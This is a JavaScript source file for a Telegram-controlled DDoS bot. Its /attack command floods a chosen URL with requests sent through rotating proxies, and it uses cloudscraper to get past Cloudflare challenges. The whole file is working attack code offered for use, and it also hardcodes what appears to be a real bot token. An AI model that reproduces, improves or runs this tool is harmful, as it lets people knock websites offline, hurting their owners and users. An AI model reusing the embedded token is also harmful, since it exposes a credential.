const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const CloudScraper = require('cloudscraper');
const path = require('path');

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token obtained from BotFather
const botToken = '7313717072:AAHWMqvcP_JIesA67NYzcGT02hwH9LziNTM';
const bot = new TelegramBot(botToken, { polling: true });

let attackInterval = null;

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const message = `
Welcome to the Bot!

To start the attack, use the following command:
/attack <url> <time> <req_per_ip> <proxies>

Example:
/attack http://example.com 60 100 http.txt

Make sure to provide the required parameters: URL, time, req_per_ip, and proxies.
  `;
  bot.sendMessage(chatId, message);
});

bot.onText(/\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const commandParams = match[1].split(' ');

  if (commandParams.length !== 4) {
    const message = 'Invalid command! Please provide the required parameters: URL, time, req_per_ip, and proxies.';
    bot.sendMessage(chatId, message);
    return;
  }

  const target = commandParams[0];
  const time = parseInt(commandParams[1]);
  const req_per_ip = parseInt(commandParams[2]);
  const proxiesFilePath = commandParams[3];

  let proxies = fs.readFileSync(proxiesFilePath, 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);

  attackInterval = setInterval(sendReq, 1000);

  setTimeout(() => {
    clearInterval(attackInterval);
    const message = 'Attack ended.';
    bot.sendMessage(chatId, message);
  }, time * 1000);

  function sendReq() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    let getHeaders = new Promise(function (resolve, reject) {
      CloudScraper({
        uri: target,
        resolveWithFullResponse: true,
        proxy: 'http://' + proxy,
        challengesToSolve: 10
      }, function (error, response) {
        if (error) {
          let obj_v = proxies.indexOf(proxy);
          proxies.splice(obj_v, 1);
          return console.log(error.message);
        }
        resolve(response.request.headers);
      });
    });

    getHeaders.then(function (result) {
      for (let i = 0; i < req_per_ip; ++i) {
        CloudScraper({
          uri: target,
          headers: result,
          proxy: 'http://' + proxy,
          followAllRedirects: false
        }, function (error, response) {
          if (error) {
            console.log(error.message);
          }
        });
      }
    });
  }
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  clearInterval(attackInterval);
  const message = 'Attack stopped.';
  bot.sendMessage(chatId, message);
});

// Handle uncaught exceptions and unhandled rejections
process.on('uncaughtException', function (err) {
  console.log(err);
});
process.on('unhandledRejection', function (err) {
  console.log(err);
});
